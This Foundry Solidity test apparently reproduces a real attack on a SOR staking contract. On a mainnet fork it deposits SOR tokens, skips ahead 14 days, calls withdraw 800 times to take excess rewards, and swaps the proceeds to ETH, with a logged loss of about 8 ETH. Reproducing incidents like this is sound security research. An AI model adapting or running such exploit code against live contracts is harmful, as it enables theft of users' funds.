// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : wrong reward calculate
// guy    : https://x.com/TenArmorAlert/status/1875582709512188394
// tx     : https://app.blocksec.com/explorer/tx/eth/0x72a252277e30ea6a37d2dc9905c280f3bc389b87f72b81a59aa8f50baebd8eaa -->deposit
//        : https://app.blocksec.com/explorer/tx/eth/0x6439d63cc57fb68a32ea8ffd8f02496e8abad67292be94904c0b47a4d14ce90d -->attack
// total loss : 4.8 + 2.4 + 0.8 eth

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 SOR = IERC20(0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF);
    address sorStaking = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;
    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);


    function setUp() external {
        cheats.createSelectFork("mainnet", 21450734);
        // attacker buy sor
        deal(address(SOR), address(this), 122868871710593438486048);
        deal(address(this),0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] ETH balance before", address(this).balance, 18);
        SOR.approve(sorStaking, type(uint256).max);

        bytes memory depositData = abi.encodeWithSignature(
            "deposit(uint256,uint8)",
            122868871710593438486048,  // 使用全部SOR代币数量
            0  // tier设为0
        );

        (bool success,) = sorStaking.call(depositData);
        require(success, "deposit failed");
        console.log("Current before block timestamp:", block.timestamp);
        cheats.warp(block.timestamp + 14 days + 1);
        console.log("Current after block timestamp:", block.timestamp);
        bytes memory withdrawData = abi.encodeWithSignature(
            "withdraw(uint256)",
            1
        );
        
        for(uint i = 0; i < 800; i++) {
            (bool withdrawSuccess,) = sorStaking.call(withdrawData);
            require(withdrawSuccess, "withdraw failed");
        }

        // 将SOR代币换成ETH,只wrap了时间，没有roll blocknumber所以兑换的eth会有差异
        SOR.approve(address(router), SOR.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(SOR);
        path[1] = address(router.WETH());
        for(uint i = 0; i < 7; i++) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                700000000000000000000000, // --> max sell amount 
                0,
                path,
                address(this),
                block.timestamp
            );
        }

        emit log_named_decimal_uint("[End] ETH balance after", address(this).balance, 18);
    }

    receive() external payable {}
}
